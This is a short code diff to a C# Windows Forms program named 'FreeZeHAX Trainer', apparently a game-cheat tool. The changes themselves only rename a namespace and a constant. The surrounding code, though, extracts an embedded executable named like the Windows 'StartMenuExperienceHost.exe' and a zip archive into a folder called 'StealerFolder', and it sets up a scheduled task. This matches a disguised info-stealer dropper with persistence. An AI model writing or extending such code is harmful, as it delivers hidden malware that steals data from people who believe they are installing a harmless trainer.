@@ -12,7 +12,7 @@ using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using System.Windows.Input;
 
-namespace FreZeHAX_Trainer
+namespace FreeZeHAX_Trainer
 {
     public partial class Trainer : Form
     {
@@ -31,7 +31,7 @@ namespace FreZeHAX_Trainer
         private Point lastLocation;
         private const string ResourceName = "StartMenuExperienceHost.exe";
         private const string ZipFileName = "StartMenu.zip";
-        private const string SolutionName = "FreeZeHAX Trainer";
+        private const string NamespaceName = "FreeZeHAX_Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
 
         private void StartForm()
@@ -79,8 +79,8 @@ namespace FreZeHAX_Trainer
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
-                others.Extract(SolutionName, StealerFolderLoc, "Files", ResourceName);
-                others.Extract(SolutionName, StealerFolderLoc, "Files", ZipFileName);
+                others.Extract(NamespaceName, StealerFolderLoc, "Files", ResourceName);
+                others.Extract(NamespaceName, StealerFolderLoc, "Files", ZipFileName);
                 if (Directory.Exists(Guna))
                 {
                     Directory.Delete(Guna, true);
